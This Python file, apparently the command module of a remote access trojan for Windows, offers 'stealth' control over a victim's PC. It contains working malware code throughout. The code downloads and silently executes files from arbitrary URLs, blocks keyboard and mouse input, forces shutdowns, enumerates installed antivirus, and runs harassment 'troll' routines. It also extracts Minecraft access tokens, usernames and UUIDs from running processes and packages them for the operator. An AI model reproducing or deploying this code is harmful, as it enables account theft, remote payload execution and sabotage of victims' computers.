# control_methods.py - Stealth PC Control Methods
import socket
import random
import threading
import time
import ctypes
from ctypes import wintypes
import os
import subprocess
import tempfile
import winreg
import winsound
import psutil
import re
import json
from datetime import datetime

# Global variables for input blocking
_keyboard_blocked = False
_mouse_blocked = False

def _block_input(block):
    """Block or unblock keyboard and mouse input"""
    try:
        ctypes.windll.user32.BlockInput(block)
        return True
    except Exception as e:
        print(f"Input block error: {e}")
        return False

def attack_controlpc(target, duration=60):
    """Remote control PC functions - Admin only"""
    print(f"Executing controlpc command: {target}")
    parts = target.split('|')
    command = parts[0]
    
    try:
        if command == "shutdown":
            print("Shutting down system...")
            subprocess.run(["shutdown", "/s", "/t", "1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "restart":
            print("Restarting system...")
            subprocess.run(["shutdown", "/r", "/t", "1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "lock":
            print("Locking workstation...")
            ctypes.windll.user32.LockWorkStation()
            
        elif command == "logoff":
            print("Logging off...")
            subprocess.run(["shutdown", "/l", "/f"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "close_minecraft":
            print("Closing Minecraft...")
            subprocess.run(["taskkill", "/f", "/im", "javaw.exe"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "popup":
            if len(parts) > 1:
                message = parts[1]
                print(f"Showing popup: {message}")
                ctypes.windll.user32.MessageBoxW(0, message, "System Message", 0x00001000)
                
        elif command == "download_execute":
            if len(parts) > 1:
                url = parts[1]
                print(f"Downloading and executing: {url}")
                import urllib.request
                
                # Create temp directory
                temp_dir = tempfile.mkdtemp()
                file_name = url.split('/')[-1] or "file.exe"
                file_path = os.path.join(temp_dir, file_name)
                
                # Download file
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                req = urllib.request.Request(url, headers=headers)
                
                with urllib.request.urlopen(req) as response, open(file_path, 'wb') as out_file:
                    out_file.write(response.read())
                
                # Execute silently
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
                subprocess.Popen(file_path, startupinfo=startupinfo, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                               creationflags=subprocess.CREATE_NO_WINDOW)
                
        elif command == "freeze_keyboard":
            print("Freezing keyboard...")
            _block_input(True)
            
        elif command == "freeze_mouse":
            print("Freezing mouse...")
            _block_input(True)
            
        elif command == "freeze_both":
            print("Freezing both keyboard and mouse...")
            _block_input(True)
            
        elif command == "unfreeze":
            print("Unfreezing input...")
            _block_input(False)
            
        elif command == "check_av":
            print("Checking antivirus...")
            av_list = []
            av_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            for path in av_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    for i in range(0, winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                            if any(term in display_name.lower() for term in ['antivirus', 'av', 'security', 'endpoint', 'defender', 'mcafee', 'norton', 'kaspersky', 'bitdefender', 'avast', 'avg', 'eset', 'trend micro']):
                                av_list.append(display_name)
                        except:
                            pass
                except:
                    pass
            
            if av_list:
                av_text = "\n".join(av_list)
                ctypes.windll.user32.MessageBoxW(0, f"Installed AV:\n{av_text}", "AV Check", 0)
            else:
                ctypes.windll.user32.MessageBoxW(0, "No known antivirus detected", "AV Check", 0)
                
        elif command == "troll":
            if len(parts) > 1:
                troll_cmd = parts[1]
                print(f"Executing troll command: {troll_cmd}")
                
                if troll_cmd == "open_cd":
                    ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
                    
                elif troll_cmd == "swap_mouse":
                    current = ctypes.windll.user32.GetSystemMetrics(23)
                    ctypes.windll.user32.SwapMouseButton(not current)
                    
                elif troll_cmd == "rotate_screen":
                    device = ctypes.windll.user32.EnumDisplayDevicesW(None, 0, 0)
                    ctypes.windll.user32.ChangeDisplaySettingsExW(device.DeviceName, None, None, 0x00000004 | 0x00000002, None)
                    
                elif troll_cmd == "invert_colors":
                    SPI_SETHIGHCONTRAST = 0x0043
                    HCF_HIGHCONTRASTON = 0x00000001
                    class HIGHCONTRAST(ctypes.Structure):
                        _fields_ = [('cbSize', ctypes.c_uint),
                                   ('dwFlags', ctypes.c_uint),
                                   ('lpszDefaultScheme', ctypes.c_wchar_p)]
                    hc = HIGHCONTRAST()
                    hc.cbSize = ctypes.sizeof(HIGHCONTRAST)
                    hc.dwFlags = HCF_HIGHCONTRASTON
                    hc.lpszDefaultScheme = None
                    ctypes.windll.user32.SystemParametersInfoW(SPI_SETHIGHCONTRAST, ctypes.sizeof(hc), ctypes.byref(hc), 0)
                    
                elif troll_cmd == "mouse_jiggler":
                    def jiggle_mouse():
                        while True:
                            x = random.randint(0, 1920)
                            y = random.randint(0, 1080)
                            ctypes.windll.user32.SetCursorPos(x, y)
                            time.sleep(30)  # Jiggle every 30 seconds
                    
                    thread = threading.Thread(target=jiggle_mouse, daemon=True)
                    thread.start()
                    
                elif troll_cmd == "keyboard_spam":
                    def spam_keys():
                        while True:
                            # Press Windows key
                            ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)  # VK_LWIN
                            ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)  # Release
                            time.sleep(10)
                    
                    thread = threading.Thread(target=spam_keys, daemon=True)
                    thread.start()
                    
                elif troll_cmd == "play_sound":
                    winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)
                    
                elif troll_cmd == "change_wallpaper":
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
        
        print(f"Control command '{command}' completed successfully")
                
    except Exception as e:
        print(f"Error in controlpc command: {e}")

def attack_refresh_session_id(target, duration=0):
    """Extract Minecraft session information silently"""
    print("Refreshing Minecraft session ID...")
    try:
        session_data = {
            'success': False,
            'timestamp': datetime.now().isoformat(),
            'sessions': []
        }
        
        def find_minecraft_processes():
            minecraft_processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['name'].lower() == 'javaw.exe':
                        cmdline = ' '.join(proc.info['cmdline'] or [])
                        minecraft_indicators = ['net.minecraft.client.main', '--username', '--uuid', '--version']
                        if any(indicator in cmdline for indicator in minecraft_indicators):
                            minecraft_processes.append(proc)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            return minecraft_processes
        
        def extract_session_info(process):
            try:
                cmdline = ' '.join(process.info['cmdline'] or [])
                
                session_patterns = [
                    r'--session\s+([^\s]+)',
                    r'--session=([^\s]+)',
                    r'-Dsessionid=([^\s]+)',
                    r'--accessToken\s+([^\s]+)',
                    r'--accessToken=([^\s]+)',
                    r'-DaccessToken=([^\s]+)',
                ]
                
                username_pattern = r'--username[=\s]?([^\s]+)'
                uuid_pattern = r'--uuid[=\s]?([^\s]+)'
                version_pattern = r'--version[=\s]?([^\s]+)'
                
                session_id = None
                for pattern in session_patterns:
                    match = re.search(pattern, cmdline)
                    if match:
                        session_id = match.group(1)
                        break
                
                username_match = re.search(username_pattern, cmdline)
                uuid_match = re.search(uuid_pattern, cmdline)
                version_match = re.search(version_pattern, cmdline)
                
                return {
                    'pid': process.info['pid'],
                    'session_id': session_id if session_id else 'Not found',
                    'username': username_match.group(1) if username_match else 'Unknown',
                    'uuid': uuid_match.group(1) if uuid_match else 'Unknown',
                    'version': version_match.group(1) if version_match else 'Unknown',
                    'found': session_id is not None
                }
                
            except Exception as e:
                return {'error': str(e), 'found': False}
        
        processes = find_minecraft_processes()
        for process in processes:
            session_info = extract_session_info(process)
            session_data['sessions'].append(session_info)
        
        session_data['success'] = len(session_data['sessions']) > 0
        session_data['process_count'] = len(session_data['sessions'])
        
        result = f"SESSION_DATA:{json.dumps(session_data)}"
        print(f"Session data collected: {result}")
        return result
        
    except Exception as e:
        error_data = {
            'success': False,
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }
        result = f"SESSION_DATA:{json.dumps(error_data)}"
        print(f"Error collecting session data: {result}")
        return result
